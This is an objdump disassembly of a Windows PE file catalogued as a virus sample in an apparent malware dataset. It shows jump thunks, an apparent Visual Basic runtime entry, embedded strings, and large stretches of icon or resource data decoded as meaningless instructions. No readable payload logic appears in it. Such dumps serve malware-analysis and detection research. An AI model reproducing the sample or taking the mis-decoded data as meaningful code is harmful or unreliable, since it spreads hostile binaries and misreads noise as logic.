
malware_samples/virus/e75e193c31c31143661215c2f7b984405a84e83551e42e4cb88ac5f2dceab3e7.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	41                   	inc    %ecx
  401001:	98                   	cwtl
  401002:	49                   	dec    %ecx
  401003:	73 c6                	jae    0x400fcb
  401005:	91                   	xchg   %eax,%ecx
  401006:	48                   	dec    %eax
  401007:	73 39                	jae    0x401042
  401009:	08 48 73             	or     %cl,0x73(%eax)
  40100c:	74 03                	je     0x401011
  40100e:	47                   	inc    %edi
  40100f:	73 31                	jae    0x401042
  401011:	68 49 73 df 68       	push   $0x68df7349
  401016:	47                   	inc    %edi
  401017:	73 66                	jae    0x40107f
  401019:	17                   	pop    %ss
  40101a:	47                   	inc    %edi
  40101b:	73 3e                	jae    0x40105b
  40101d:	55                   	push   %ebp
  40101e:	47                   	inc    %edi
  40101f:	73 62                	jae    0x401083
  401021:	72 49                	jb     0x40106c
  401023:	73 fa                	jae    0x40101f
  401025:	00 48 73             	add    %cl,0x73(%eax)
  401028:	81 07 48 73 e4 73    	addl   $0x73e47348,(%edi)
  40102e:	47                   	inc    %edi
  40102f:	73 ba                	jae    0x400feb
  401031:	68 47 73 29 75       	push   $0x75297347
  401036:	47                   	inc    %edi
  401037:	73 95                	jae    0x400fce
  401039:	c1 45 73 c0          	roll   $0xc0,0x73(%ebp)
  40103d:	a0 46 73 ae 00       	mov    0xae7346,%al
  401042:	48                   	dec    %eax
  401043:	73 4a                	jae    0x40108f
  401045:	c0 46 73 e2          	rolb   $0xe2,0x73(%esi)
  401049:	47                   	inc    %edi
  40104a:	47                   	inc    %edi
  40104b:	73 46                	jae    0x401093
  40104d:	01 48 73             	add    %ecx,0x73(%eax)
  401050:	46                   	inc    %esi
  401051:	02 48 73             	add    0x73(%eax),%cl
  401054:	51                   	push   %ecx
  401055:	df 45 73             	filds  0x73(%ebp)
  401058:	2e 93                	cs xchg %eax,%ebx
  40105a:	48                   	dec    %eax
  40105b:	73 73                	jae    0x4010d0
  40105d:	6e                   	outsb  %ds:(%esi),(%dx)
  40105e:	47                   	inc    %edi
  40105f:	73 2a                	jae    0x40108b
  401061:	61                   	popa
  401062:	48                   	dec    %eax
  401063:	73 ca                	jae    0x40102f
  401065:	3f                   	aas
  401066:	46                   	inc    %esi
  401067:	73 cf                	jae    0x401038
  401069:	99                   	cltd
  40106a:	45                   	inc    %ebp
  40106b:	73 5c                	jae    0x4010c9
  40106d:	c2 46 73             	ret    $0x7346
  401070:	da 93 47 73 b0 55    	ficoml 0x55b07347(%ebx)
  401076:	47                   	inc    %edi
  401077:	73 f6                	jae    0x40106f
  401079:	97                   	xchg   %eax,%edi
  40107a:	49                   	dec    %ecx
  40107b:	73 45                	jae    0x4010c2
  40107d:	18 47 73             	sbb    %al,0x73(%edi)
  401080:	e5 a0                	in     $0xa0,%eax
  401082:	39 73 85             	cmp    %esi,-0x7b(%ebx)
  401085:	c1 46 73 36          	roll   $0x36,0x73(%esi)
  401089:	08 48 73             	or     %cl,0x73(%eax)
  40108c:	5c                   	pop    %esp
  40108d:	94                   	xchg   %eax,%esp
  40108e:	47                   	inc    %edi
  40108f:	73 56                	jae    0x4010e7
  401091:	c1 46 73 e2          	roll   $0xe2,0x73(%esi)
  401095:	99                   	cltd
  401096:	45                   	inc    %ebp
  401097:	73 d3                	jae    0x40106c
  401099:	93                   	xchg   %eax,%ebx
  40109a:	48                   	dec    %eax
  40109b:	73 e0                	jae    0x40107d
  40109d:	98                   	cwtl
  40109e:	45                   	inc    %ebp
  40109f:	73 24                	jae    0x4010c5
  4010a1:	46                   	inc    %esi
  4010a2:	47                   	inc    %edi
  4010a3:	73 78                	jae    0x40111d
  4010a5:	bd 45 73 c9 04       	mov    $0x4c97345,%ebp
  4010aa:	48                   	dec    %eax
  4010ab:	73 fa                	jae    0x4010a7
  4010ad:	01 48 73             	add    %ecx,0x73(%eax)
  4010b0:	93                   	xchg   %eax,%ebx
  4010b1:	0d 47 73 13 75       	or     $0x75137347,%eax
  4010b6:	49                   	dec    %ecx
  4010b7:	73 d1                	jae    0x40108a
  4010b9:	71 47                	jno    0x401102
  4010bb:	73 2d                	jae    0x4010ea
  4010bd:	8e 47 73             	mov    0x73(%edi),%es
  4010c0:	94                   	xchg   %eax,%esp
  4010c1:	55                   	push   %ebp
  4010c2:	47                   	inc    %edi
  4010c3:	73 a6                	jae    0x40106b
  4010c5:	c4 46 73             	les    0x73(%esi),%eax
  4010c8:	85 17                	test   %edx,(%edi)
  4010ca:	47                   	inc    %edi
  4010cb:	73 c1                	jae    0x40108e
  4010cd:	67 47                	addr16 inc %edi
  4010cf:	73 44                	jae    0x401115
  4010d1:	52                   	push   %edx
  4010d2:	46                   	inc    %esi
  4010d3:	73 6b                	jae    0x401140
  4010d5:	92                   	xchg   %eax,%edx
  4010d6:	48                   	dec    %eax
  4010d7:	73 c1                	jae    0x40109a
  4010d9:	e6 45                	out    %al,$0x45
  4010db:	73 5d                	jae    0x40113a
  4010dd:	3b 46 73             	cmp    0x73(%esi),%eax
  4010e0:	83 a0 46 73 7a 01 48 	andl   $0x48,0x17a7346(%eax)
  4010e7:	73 7a                	jae    0x401163
  4010e9:	02 48 73             	add    0x73(%eax),%cl
  4010ec:	8e 6a 47             	mov    0x47(%edx),%gs
  4010ef:	73 45                	jae    0x401136
  4010f1:	6a 47                	push   $0x47
  4010f3:	73 ae                	jae    0x4010a3
  4010f5:	01 48 73             	add    %ecx,0x73(%eax)
  4010f8:	e9 fb 47 73 45       	jmp    0x45b358f8
  4010fd:	60                   	pusha
  4010fe:	46                   	inc    %esi
  4010ff:	73 a4                	jae    0x4010a5
  401101:	35 39 73 0f 98       	xor    $0x980f7339,%eax
  401106:	49                   	dec    %ecx
  401107:	73 71                	jae    0x40117a
  401109:	60                   	pusha
  40110a:	46                   	inc    %esi
  40110b:	73 bf                	jae    0x4010cc
  40110d:	a3 39 73 00 91       	mov    %eax,0x91007339
  401112:	48                   	dec    %eax
  401113:	73 74                	jae    0x401189
  401115:	6a 47                	push   $0x47
  401117:	73 f5                	jae    0x40110e
  401119:	6c                   	insb   (%dx),%es:(%edi)
  40111a:	47                   	inc    %edi
  40111b:	73 2d                	jae    0x40114a
  40111d:	ed                   	in     (%dx),%eax
  40111e:	47                   	inc    %edi
  40111f:	73 84                	jae    0x4010a5
  401121:	94                   	xchg   %eax,%esp
  401122:	48                   	dec    %eax
  401123:	73 51                	jae    0x401176
  401125:	db 47 73             	fildl  0x73(%edi)
  401128:	30 6a 47             	xor    %ch,0x47(%edx)
  40112b:	73 fb                	jae    0x401128
  40112d:	9d                   	popf
  40112e:	46                   	inc    %esi
  40112f:	73 00                	jae    0x401131
  401131:	00 00                	add    %al,(%eax)
  401133:	00 00                	add    %al,(%eax)
  401135:	00 00                	add    %al,(%eax)
  401137:	00 05 00 08 00 9b    	add    %al,0x9b000800
  40113d:	2e 40                	cs inc %eax
  40113f:	00 00                	add    %al,(%eax)
  401141:	00 00                	add    %al,(%eax)
  401143:	00 a2 2e 40 00 26    	add    %ah,0x2600402e(%edx)
  401149:	00 14 00             	add    %dl,(%eax,%eax,1)
  40114c:	00 00                	add    %al,(%eax)
  40114e:	00 00                	add    %al,(%eax)
  401150:	20 34 40             	and    %dh,(%eax,%eax,2)
  401153:	00 f4                	add    %dh,%ah
  401155:	33 40 00             	xor    0x0(%eax),%eax
  401158:	00 00                	add    %al,(%eax)
  40115a:	00 00                	add    %al,(%eax)
  40115c:	60                   	pusha
  40115d:	11 40 00             	adc    %eax,0x0(%eax)
  401160:	1b 00                	sbb    (%eax),%eax
  401162:	00 00                	add    %al,(%eax)
  401164:	3e 2f                	ds das
  401166:	40                   	inc    %eax
  401167:	00 51 2f             	add    %dl,0x2f(%ecx)
  40116a:	40                   	inc    %eax
  40116b:	00 60 2f             	add    %ah,0x2f(%eax)
  40116e:	40                   	inc    %eax
  40116f:	00 cd                	add    %cl,%ch
  401171:	2f                   	das
  401172:	40                   	inc    %eax
  401173:	00 ee                	add    %ch,%dh
  401175:	2f                   	das
  401176:	40                   	inc    %eax
  401177:	00 ee                	add    %ch,%dh
  401179:	2f                   	das
  40117a:	40                   	inc    %eax
  40117b:	00 22                	add    %ah,(%edx)
  40117d:	30 40 00             	xor    %al,0x0(%eax)
  401180:	40                   	inc    %eax
  401181:	30 40 00             	xor    %al,0x0(%eax)
  401184:	4d                   	dec    %ebp
  401185:	30 40 00             	xor    %al,0x0(%eax)
  401188:	a0 30 40 00 db       	mov    0xdb004030,%al
  40118d:	30 40 00             	xor    %al,0x0(%eax)
  401190:	f1                   	int1
  401191:	30 40 00             	xor    %al,0x0(%eax)
  401194:	16                   	push   %ss
  401195:	31 40 00             	xor    %eax,0x0(%eax)
  401198:	9c                   	pushf
  401199:	31 40 00             	xor    %eax,0x0(%eax)
  40119c:	9c                   	pushf
  40119d:	31 40 00             	xor    %eax,0x0(%eax)
  4011a0:	a1 31 40 00 bd       	mov    0xbd004031,%eax
  4011a5:	31 40 00             	xor    %eax,0x0(%eax)
  4011a8:	68 32 40 00 97       	push   $0x97004032
  4011ad:	32 40 00             	xor    0x0(%eax),%al
  4011b0:	97                   	xchg   %eax,%edi
  4011b1:	32 40 00             	xor    0x0(%eax),%al
  4011b4:	97                   	xchg   %eax,%edi
  4011b5:	32 40 00             	xor    0x0(%eax),%al
  4011b8:	cc                   	int3
  4011b9:	32 40 00             	xor    0x0(%eax),%al
  4011bc:	d1 32                	shll   $1,(%edx)
  4011be:	40                   	inc    %eax
  4011bf:	00 1e                	add    %bl,(%esi)
  4011c1:	33 40 00             	xor    0x0(%eax),%eax
  4011c4:	be 33 40 00 ca       	mov    $0xca004033,%esi
  4011c9:	33 40 00             	xor    0x0(%eax),%eax
  4011cc:	ed                   	in     (%dx),%eax
  4011cd:	33 40 00             	xor    0x0(%eax),%eax
	...
  4011d8:	0e                   	push   %cs
  4011d9:	00 08                	add    %cl,(%eax)
  4011db:	00 00                	add    %al,(%eax)
  4011dd:	00 00                	add    %al,(%eax)
  4011df:	00 85 35 40 00 62    	add    %al,0x62004035(%ebp)
  4011e5:	35 40 00 0e 00       	xor    $0xe0040,%eax
  4011ea:	08 00                	or     %al,(%eax)
  4011ec:	00 00                	add    %al,(%eax)
  4011ee:	00 00                	add    %al,(%eax)
  4011f0:	0a 37                	or     (%edi),%dh
  4011f2:	40                   	inc    %eax
  4011f3:	00 de                	add    %bl,%dh
  4011f5:	36 40                	ss inc %eax
  4011f7:	00 06                	add    %al,(%esi)
  4011f9:	00 04 00             	add    %al,(%eax,%eax,1)
  4011fc:	00 00                	add    %al,(%eax)
  4011fe:	00 00                	add    %al,(%eax)
  401200:	33 3a                	xor    (%edx),%edi
  401202:	40                   	inc    %eax
  401203:	00 ff                	add    %bh,%bh
  401205:	39 40 00             	cmp    %eax,0x0(%eax)
	...
  401210:	ff 25 60 10 40 00    	jmp    *0x401060
  401216:	ff 25 a0 10 40 00    	jmp    *0x4010a0
  40121c:	ff 25 b4 10 40 00    	jmp    *0x4010b4
  401222:	ff 25 4c 10 40 00    	jmp    *0x40104c
  401228:	ff 25 40 10 40 00    	jmp    *0x401040
  40122e:	ff 25 e4 10 40 00    	jmp    *0x4010e4
  401234:	ff 25 24 10 40 00    	jmp    *0x401024
  40123a:	ff 25 f8 10 40 00    	jmp    *0x4010f8
  401240:	ff 25 50 10 40 00    	jmp    *0x401050
  401246:	ff 25 f4 10 40 00    	jmp    *0x4010f4
  40124c:	ff 25 e8 10 40 00    	jmp    *0x4010e8
  401252:	ff 25 ac 10 40 00    	jmp    *0x4010ac
  401258:	ff 25 88 10 40 00    	jmp    *0x401088
  40125e:	ff 25 a8 10 40 00    	jmp    *0x4010a8
  401264:	ff 25 28 10 40 00    	jmp    *0x401028
  40126a:	ff 25 08 10 40 00    	jmp    *0x401008
  401270:	ff 25 10 11 40 00    	jmp    *0x401110
  401276:	ff 25 04 10 40 00    	jmp    *0x401004
  40127c:	ff 25 24 11 40 00    	jmp    *0x401124
  401282:	ff 25 d4 10 40 00    	jmp    *0x4010d4
  401288:	ff 25 58 10 40 00    	jmp    *0x401058
  40128e:	ff 25 98 10 40 00    	jmp    *0x401098
  401294:	ff 25 20 11 40 00    	jmp    *0x401120
  40129a:	ff 25 1c 11 40 00    	jmp    *0x40111c
  4012a0:	ff 25 d8 10 40 00    	jmp    *0x4010d8
  4012a6:	ff 25 20 10 40 00    	jmp    *0x401020
  4012ac:	ff 25 f0 10 40 00    	jmp    *0x4010f0
  4012b2:	ff 25 cc 10 40 00    	jmp    *0x4010cc
  4012b8:	ff 25 c8 10 40 00    	jmp    *0x4010c8
  4012be:	ff 25 ec 10 40 00    	jmp    *0x4010ec
  4012c4:	ff 25 b0 10 40 00    	jmp    *0x4010b0
  4012ca:	ff 25 2c 11 40 00    	jmp    *0x40112c
  4012d0:	ff 25 e0 10 40 00    	jmp    *0x4010e0
  4012d6:	ff 25 3c 10 40 00    	jmp    *0x40103c
  4012dc:	ff 25 80 10 40 00    	jmp    *0x401080
  4012e2:	ff 25 a4 10 40 00    	jmp    *0x4010a4
  4012e8:	ff 25 34 10 40 00    	jmp    *0x401034
  4012ee:	ff 25 38 10 40 00    	jmp    *0x401038
  4012f4:	ff 25 0c 11 40 00    	jmp    *0x40110c
  4012fa:	ff 25 7c 10 40 00    	jmp    *0x40107c
  401300:	ff 25 8c 10 40 00    	jmp    *0x40108c
  401306:	ff 25 5c 10 40 00    	jmp    *0x40105c
  40130c:	ff 25 18 10 40 00    	jmp    *0x401018
  401312:	ff 25 14 10 40 00    	jmp    *0x401014
  401318:	ff 25 44 10 40 00    	jmp    *0x401044
  40131e:	ff 25 90 10 40 00    	jmp    *0x401090
  401324:	ff 25 2c 10 40 00    	jmp    *0x40102c
  40132a:	ff 25 78 10 40 00    	jmp    *0x401078
  401330:	ff 25 6c 10 40 00    	jmp    *0x40106c
  401336:	ff 25 84 10 40 00    	jmp    *0x401084
  40133c:	ff 25 28 11 40 00    	jmp    *0x401128
  401342:	ff 25 08 11 40 00    	jmp    *0x401108
  401348:	ff 25 54 10 40 00    	jmp    *0x401054
  40134e:	ff 25 70 10 40 00    	jmp    *0x401070
  401354:	ff 25 d0 10 40 00    	jmp    *0x4010d0
  40135a:	ff 25 30 10 40 00    	jmp    *0x401030
  401360:	ff 25 14 11 40 00    	jmp    *0x401114
  401366:	ff 25 10 10 40 00    	jmp    *0x401010
  40136c:	ff 25 18 11 40 00    	jmp    *0x401118
  401372:	ff 25 04 11 40 00    	jmp    *0x401104
  401378:	ff 25 48 10 40 00    	jmp    *0x401048
  40137e:	ff 25 c4 10 40 00    	jmp    *0x4010c4
  401384:	ff 25 0c 10 40 00    	jmp    *0x40100c
  40138a:	ff 25 1c 10 40 00    	jmp    *0x40101c
  401390:	ff 25 74 10 40 00    	jmp    *0x401074
  401396:	ff 25 bc 10 40 00    	jmp    *0x4010bc
  40139c:	ff 25 b8 10 40 00    	jmp    *0x4010b8
  4013a2:	ff 25 00 10 40 00    	jmp    *0x401000
  4013a8:	ff 25 64 10 40 00    	jmp    *0x401064
  4013ae:	ff 25 c0 10 40 00    	jmp    *0x4010c0
  4013b4:	ff 25 dc 10 40 00    	jmp    *0x4010dc
  4013ba:	ff 25 fc 10 40 00    	jmp    *0x4010fc
  4013c0:	ff 25 9c 10 40 00    	jmp    *0x40109c
  4013c6:	ff 25 68 10 40 00    	jmp    *0x401068
  4013cc:	ff 25 94 10 40 00    	jmp    *0x401094
  4013d2:	ff 25 00 11 40 00    	jmp    *0x401100
  4013d8:	68 b0 22 40 00       	push   $0x4022b0
  4013dd:	e8 f0 ff ff ff       	call   0x4013d2
  4013e2:	00 00                	add    %al,(%eax)
  4013e4:	00 00                	add    %al,(%eax)
  4013e6:	00 00                	add    %al,(%eax)
  4013e8:	30 00                	xor    %al,(%eax)
  4013ea:	00 00                	add    %al,(%eax)
  4013ec:	38 00                	cmp    %al,(%eax)
  4013ee:	00 00                	add    %al,(%eax)
  4013f0:	00 00                	add    %al,(%eax)
  4013f2:	00 00                	add    %al,(%eax)
  4013f4:	35 34 ea 7c 4a       	xor    $0x4a7cea34,%eax
  4013f9:	20 e2                	and    %ah,%dl
  4013fb:	42                   	inc    %edx
  4013fc:	aa                   	stos   %al,%es:(%edi)
  4013fd:	86 ae 7b 96 a0 ee    	xchg   %ch,-0x115f6985(%esi)
  401403:	90                   	nop
  401404:	00 00                	add    %al,(%eax)
  401406:	00 00                	add    %al,(%eax)
  401408:	00 00                	add    %al,(%eax)
  40140a:	01 00                	add    %eax,(%eax)
	...
  401414:	b9 a4 b3 cc 31       	mov    $0x31ccb3a4,%ecx
  401419:	00 00                	add    %al,(%eax)
  40141b:	00 00                	add    %al,(%eax)
  40141d:	00 00                	add    %al,(%eax)
  40141f:	00 ff                	add    %bh,%bh
  401421:	cc                   	int3
  401422:	31 00                	xor    %eax,(%eax)
  401424:	00 a2 87 30 16 94    	add    %ah,-0x6be9cf79(%edx)
  40142a:	2f                   	das
  40142b:	45                   	inc    %ebp
  40142c:	41                   	inc    %ecx
  40142d:	94                   	xchg   %eax,%esp
  40142e:	39 9b 34 cd 08 8a    	cmp    %ebx,-0x75f732cc(%ebx)
  401434:	ce                   	into
  401435:	13 92 af 4e 0c ca    	adc    -0x35f3b151(%edx),%edx
  40143b:	b4 43                	mov    $0x43,%ah
  40143d:	9c                   	pushf
  40143e:	ae                   	scas   %es:(%edi),%al
  40143f:	68 87 99 1e 80       	push   $0x801e9987
  401444:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401445:	3a 4f ad             	cmp    -0x53(%edi),%cl
  401448:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  40144e:	0c 00                	or     $0x0,%al
  401450:	aa                   	stos   %al,%es:(%edi)
  401451:	00 60 d3             	add    %ah,-0x2d(%eax)
  401454:	93                   	xchg   %eax,%ebx
	...
  401479:	29 0d 00 00 24 0d    	sub    %ecx,0xd240000
  40147f:	00 00                	add    %al,(%eax)
  401481:	00 05 00 76 69 72    	add    %al,0x72697600
  401487:	75 73                	jne    0x4014fc
  401489:	00 0d 01 21 00 56    	add    %cl,0x56002101
  40148f:	42                   	inc    %edx
  401490:	bd f0 d6 ed b1       	mov    $0xb1edd6f0,%ebp
  401495:	a8 cf                	test   $0xcf,%al
  401497:	b2 20                	mov    $0x20,%dl
  401499:	42                   	inc    %edx
  40149a:	59                   	pop    %ecx
  40149b:	a3 ba d0 a1 ee       	mov    %eax,0xeea1d0ba
  4014a0:	c8 20 51 51          	enter  $0x5120,$0x51
  4014a4:	a3 ba 38 37 31       	mov    %eax,0x313738ba
  4014a9:	34 30                	xor    $0x30,%al
  4014ab:	38 33                	cmp    %dh,(%ebx)
  4014ad:	39 36                	cmp    %esi,(%esi)
  4014af:	00 19                	add    %bl,(%ecx)
  4014b1:	01 00                	add    %eax,(%eax)
  4014b3:	42                   	inc    %edx
  4014b4:	00 22                	add    %ah,(%edx)
  4014b6:	01 23                	add    %esp,(%ebx)
  4014b8:	c6                   	(bad)
  4014b9:	0c 00                	or     $0x0,%al
  4014bb:	00 6c 74 00          	add    %ch,0x0(%esp,%esi,2)
  4014bf:	00 be 0c 00 00 00    	add    %bh,0xc(%esi)
  4014c5:	00 01                	add    %al,(%ecx)
  4014c7:	00 01                	add    %al,(%ecx)
  4014c9:	00 20                	add    %ah,(%eax)
  4014cb:	20 00                	and    %al,(%eax)
  4014cd:	00 01                	add    %al,(%ecx)
  4014cf:	00 18                	add    %bl,(%eax)
  4014d1:	00 a8 0c 00 00 16    	add    %ch,0x1600000c(%eax)
  4014d7:	00 00                	add    %al,(%eax)
  4014d9:	00 28                	add    %ch,(%eax)
  4014db:	00 00                	add    %al,(%eax)
  4014dd:	00 20                	add    %ah,(%eax)
  4014df:	00 00                	add    %al,(%eax)
  4014e1:	00 40 00             	add    %al,0x0(%eax)
  4014e4:	00 00                	add    %al,(%eax)
  4014e6:	01 00                	add    %eax,(%eax)
  4014e8:	18 00                	sbb    %al,(%eax)
  4014ea:	00 00                	add    %al,(%eax)
  4014ec:	00 00                	add    %al,(%eax)
  4014ee:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
	...
  401502:	fe                   	(bad)
  401503:	ff                   	(bad)
  401504:	ff f2                	push   %edx
  401506:	ff                   	(bad)
  401507:	fe                   	(bad)
  401508:	ff                   	(bad)
  401509:	ff                   	(bad)
  40150a:	ff                   	(bad)
  40150b:	ff                   	(bad)
  40150c:	ff                   	(bad)
  40150d:	ff f0                	push   %eax
  40150f:	fe                   	(bad)
  401510:	fe                   	(bad)
  401511:	d8 fd                	fdivr  %st(5),%st
  401513:	fe                   	(bad)
  401514:	fe                   	(bad)
  401515:	ff                   	(bad)
  401516:	ff                   	(bad)
  401517:	ff                   	(bad)
  401518:	ff                   	(bad)
  401519:	ff                   	(bad)
  40151a:	ff                   	(bad)
  40151b:	ff                   	(bad)
  40151c:	ff                   	(bad)
  40151d:	fc                   	cld
  40151e:	fc                   	cld
  40151f:	fd                   	std
  401520:	db e3                	fninit
  401522:	e9 85 ae c1 51       	jmp    0x5201c3ac
  401527:	9d                   	popf
  401528:	b8 20 a0 c6 20       	mov    $0x20c6a020,%eax
  40152d:	a0 c6 20 a0 c6       	mov    0xc6a020c6,%al
  401532:	25 9f c4 57 9e       	and    $0x9e57c49f,%eax
  401537:	b9 90 b3 c3 d1       	mov    $0xd1c3b390,%ecx
  40153c:	dc e3                	fsub   %st,%st(3)
  40153e:	f7 f9                	idiv   %ecx
  401540:	fa                   	cli
  401541:	fe                   	(bad)
  401542:	ff                   	(bad)
  401543:	ff                   	(bad)
  401544:	fe                   	(bad)
  401545:	ff                   	(bad)
  401546:	ff                   	lcall  (bad)
  401547:	d8 fe                	fdivr  %st(6),%st
  401549:	fe                   	(bad)
  40154a:	e6 ff                	out    %al,$0xff
  40154c:	ff                   	(bad)
  40154d:	ff                   	(bad)
  40154e:	ff                   	(bad)
  40154f:	ff                   	(bad)
  401550:	ff                   	(bad)
  401551:	ff                   	(bad)
  401552:	ff                   	(bad)
  401553:	ff                   	(bad)
  401554:	ff                   	(bad)
  401555:	ff                   	(bad)
  401556:	fa                   	cli
  401557:	fe                   	(bad)
  401558:	fa                   	cli
  401559:	f1                   	int1
  40155a:	fc                   	cld
  40155b:	f1                   	int1
  40155c:	fd                   	std
  40155d:	fe                   	(bad)
  40155e:	fd                   	std
  40155f:	ff                   	(bad)
  401560:	ff                   	(bad)
  401561:	ff                   	(bad)
  401562:	fe                   	(bad)
  401563:	ff                   	(bad)
  401564:	ff f1                	push   %ecx
  401566:	fe                   	(bad)
  401567:	fd                   	std
  401568:	fe                   	(bad)
  401569:	fe                   	(bad)
  40156a:	fe                   	(bad)
  40156b:	fc                   	cld
  40156c:	fc                   	cld
  40156d:	fe                   	(bad)
  40156e:	f0 fe                	lock (bad)
  401570:	fe                   	(bad)
  401571:	d7                   	xlat   %ds:(%ebx)
  401572:	fd                   	std
  401573:	fe                   	(bad)
  401574:	fd                   	std
  401575:	fe                   	(bad)
  401576:	fe                   	(bad)
  401577:	fe                   	(bad)
  401578:	fe                   	(bad)
  401579:	fe                   	(bad)
  40157a:	e0 e8                	loopne 0x401564
  40157c:	ed                   	in     (%dx),%eax
  40157d:	75 ae                	jne    0x40152d
  40157f:	c2 39 b0             	ret    $0xb039
  401582:	cf                   	iret
  401583:	25 c5 eb 1e cb       	and    $0xcb1eebc5,%eax
  401588:	f3 18 ce             	repz sbb %cl,%dh
  40158b:	f6 18                	negb   (%eax)
  40158d:	ce                   	into
  40158e:	f6 18                	negb   (%eax)
  401590:	ce                   	into
  401591:	f6 19                	negb   (%ecx)
  401593:	ce                   	into
  401594:	f6 1f                	negb   (%edi)
  401596:	cc                   	int3
  401597:	f3 24 c5             	repz and $0xc5,%al
  40159a:	ea 2d b5 da 69 ab c3 	ljmp   $0xc3ab,$0x69dab52d
  4015a1:	c5 d5 dd f5          	vpaddusw %ymm5,%ymm5,%ymm6
  4015a5:	f7 f9                	idiv   %ecx
  4015a7:	d8 fd                	fdivr  %st(5),%st
  4015a9:	fd                   	std
  4015aa:	e6 fe                	out    %al,$0xfe
  4015ac:	fe                   	(bad)
  4015ad:	ff                   	(bad)
  4015ae:	ff                   	(bad)
  4015af:	ff                   	(bad)
  4015b0:	fb                   	sti
  4015b1:	fb                   	sti
  4015b2:	fe                   	(bad)
  4015b3:	f9                   	stc
  4015b4:	f9                   	stc
  4015b5:	fd                   	std
  4015b6:	eb fc                	jmp    0x4015b4
  4015b8:	ec                   	in     (%dx),%al
  4015b9:	b3 f4                	mov    $0xf4,%bl
  4015bb:	b2 eb                	mov    $0xeb,%dl
  4015bd:	fc                   	cld
  4015be:	ea ff ff ff fe ff ff 	ljmp   $0xffff,$0xfeffffff
  4015c5:	fa                   	cli
  4015c6:	fe                   	(bad)
  4015c7:	fd                   	std
  4015c8:	f8                   	clc
  4015c9:	f9                   	stc
  4015ca:	fb                   	sti
  4015cb:	e4 ea                	in     $0xea,%al
  4015cd:	ee                   	out    %al,(%dx)
  4015ce:	dd e7                	fucom  %st(7)
  4015d0:	eb dc                	jmp    0x4015ae
  4015d2:	ec                   	in     (%dx),%al
  4015d3:	ef                   	out    %eax,(%dx)
  4015d4:	e0 e7                	loopne 0x4015bd
  4015d6:	eb a7                	jmp    0x40157f
  4015d8:	c4                   	(bad)
  4015d9:	d2 4f b7             	rorb   %cl,-0x49(%edi)
  4015dc:	d4 2a                	aam    $0x2a
  4015de:	c4                   	(bad)
  4015df:	e8 19 c8 ef 17       	call   0x182fddfd
  4015e4:	cf                   	iret
  4015e5:	f8                   	clc
  4015e6:	17                   	pop    %ss
  4015e7:	d3 fc                	sar    %cl,%esp
  4015e9:	18 d5                	sbb    %dl,%ch
  4015eb:	fc                   	cld
  4015ec:	1a d5                	sbb    %ch,%dl
  4015ee:	fb                   	sti
  4015ef:	17                   	pop    %ss
  4015f0:	cf                   	iret
  4015f1:	f8                   	clc
  4015f2:	16                   	push   %ss
  4015f3:	ce                   	into
  4015f4:	f8                   	clc
  4015f5:	17                   	pop    %ss
  4015f6:	d0 f7                	shl    $1,%bh
  4015f8:	17                   	pop    %ss
  4015f9:	cd f5                	int    $0xf5
  4015fb:	16                   	push   %ss
  4015fc:	c9                   	leave
  4015fd:	f2 27                	repnz daa
  4015ff:	c3                   	ret
  401600:	e9 44 bd dd 97       	jmp    0x981dd349
  401605:	c5 d5 ec fa          	vpaddsb %ymm2,%ymm5,%ymm7
  401609:	fa                   	cli
  40160a:	f7 fe                	idiv   %esi
  40160c:	fe                   	(bad)
  40160d:	ff                   	(bad)
  40160e:	ff                   	(bad)
  40160f:	ff d4                	call   *%esp
  401611:	d3 f6                	shl    %cl,%esi
  401613:	c2 c2 f2             	ret    $0xf2c2
  401616:	f7 fd                	idiv   %ebp
  401618:	f7 e3                	mul    %ebx
  40161a:	fa                   	cli
  40161b:	e2 f7                	loop   0x401614
  40161d:	fd                   	std
  40161e:	f7 ff                	idiv   %edi
  401620:	ff                   	(bad)
  401621:	ff                   	(bad)
  401622:	ff                   	(bad)
  401623:	ff                   	(bad)
  401624:	ff e0                	jmp    *%eax
  401626:	eb ef                	jmp    0x401617
  401628:	8a b7 ca 64 b7 d0    	mov    -0x2f489b36(%edi),%dh
  40162e:	60                   	pusha
  40162f:	c2 dd 61             	ret    $0x61dd
  401632:	aa                   	stos   %al,%es:(%edi)
  401633:	c4 5d ac             	les    -0x54(%ebp),%ebx
  401636:	c6 43 bd dd          	movb   $0xdd,-0x43(%ebx)
  40163a:	1a c2                	sbb    %dl,%al
  40163c:	e9 18 d0 f8 18       	jmp    0x1938e659
  401641:	d3 fb                	sar    %cl,%ebx
  401643:	15 c3 ec 14 b4       	adc    $0xb414ecc3,%eax
  401648:	dc 14 b6             	fcoml  (%esi,%esi,4)
  40164b:	dd 17                	fstl   (%edi)
  40164d:	bd e3 18 ce f6       	mov    $0xf6ce18e3,%ebp
  401652:	17                   	pop    %ss
  401653:	ce                   	into
  401654:	f6 1e                	negb   (%esi)
  401656:	d2 f6                	shl    %cl,%dh
  401658:	1d d2 f7 15 ce       	sbb    $0xce15f7d2,%eax
  40165d:	f8                   	clc
  40165e:	18 d0                	sbb    %dl,%al
  401660:	f8                   	clc
  401661:	18 c8                	sbb    %cl,%al
  401663:	f0 3b c0             	lock cmp %eax,%eax
  401666:	e1 90                	loope  0x4015f8
  401668:	c1 d2 fa             	rcl    $0xfa,%edx
  40166b:	fc                   	cld
  40166c:	fc                   	cld
  40166d:	fe                   	(bad)
  40166e:	fe                   	(bad)
  40166f:	fe                   	(bad)
  401670:	e0 df                	loopne 0x401651
  401672:	fa                   	cli
  401673:	d3 d3                	rcl    %cl,%ebx
  401675:	f7 fd                	idiv   %ebp
  401677:	fe                   	(bad)
  401678:	fd                   	std
  401679:	fb                   	sti
  40167a:	fd                   	std
  40167b:	fb                   	sti
  40167c:	fd                   	std
  40167d:	fe                   	(bad)
  40167e:	fd                   	std
  40167f:	dc fc                	fdivr  %st,%st(4)
  401681:	fd                   	std
  401682:	ff                   	(bad)
  401683:	ff                   	(bad)
  401684:	ff d0                	call   *%eax
  401686:	e2 e9                	loop   0x401671
  401688:	49                   	dec    %ecx
  401689:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40168a:	c0 24 b0 d1          	shlb   $0xd1,(%eax,%esi,4)
  40168e:	12 a8 d0 13 9c c4    	adc    -0x3b63ec30(%eax),%ch
  401694:	14 ae                	adc    $0xae,%al
  401696:	d5 17                	aad    $0x17
  401698:	ca f3 17             	lret   $0x17f3
  40169b:	d0 f9                	sar    $1,%cl
